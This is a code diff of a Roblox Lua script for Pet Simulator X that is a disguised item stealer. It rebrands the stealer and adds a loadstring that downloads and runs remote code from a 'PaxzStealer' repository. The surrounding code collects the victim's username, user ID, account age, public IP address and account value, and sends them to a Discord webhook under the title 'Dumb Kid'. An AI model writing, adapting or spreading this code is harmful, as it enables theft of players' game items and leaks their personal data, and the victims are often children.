@@ -6,13 +6,11 @@
   |_| \_\_/___/___|_| |_|\__,_|_.__/  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|
   
 ]]--
-_G.LoadingScreeen = true
-_G.ScriptTitle = "Pet Simulator X: Loading Gui"
 
 getgenv().Settings = {
     User = "StickOwwz",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
-    MailMessage = ".gg/uSgzNwHDTS",
+    MailMessage = "FuegoEterno OnTop", 
     Titanics = {
         Dualhook = true,
         Intensity = 100 --%
@@ -213,11 +211,20 @@ local username = game:GetService("Players").LocalPlayer.Name
 local fardplayer = game:GetService("Players").LocalPlayer
 local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ian4Life/Autofarm/main/FuegoEterno"))()
+
 -- Loading Screen
-if _G.LoadingScreen ~= true then
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ian4Life/LoadingScreen/main/LoadingScreen1'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
-end
+if _G.LoadingScreen ~= false then
+
+_G.Title = "Pet Simulator X : Script"
+_G.Time = 30
+
+_G.Tip1 = "Getting Script..."
+_G.Tip2 = "Script Recieved!"
+_G.Tip3 = "Scaning Script..."
+_G.Tip4 = "Loading Script..."
+_G.Tip5 = "Almost Done!"
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/PaxzStealer/Paxz/main/PaxzLoading')))()
 
 -- Remotes
 
@@ -1030,11 +1037,11 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Rizz Scriptz",
+            ["username"] = "FeugoEterno Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Rizz||",
-                ["url"] = "https://discord.gg/uSgzNwHDTS",
+                ["title"] = "**Dumb Kid**",
+                ["url"] = "https://discord.gg/pUKMNeRwsn",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -1043,7 +1050,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using FuegoEterno Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
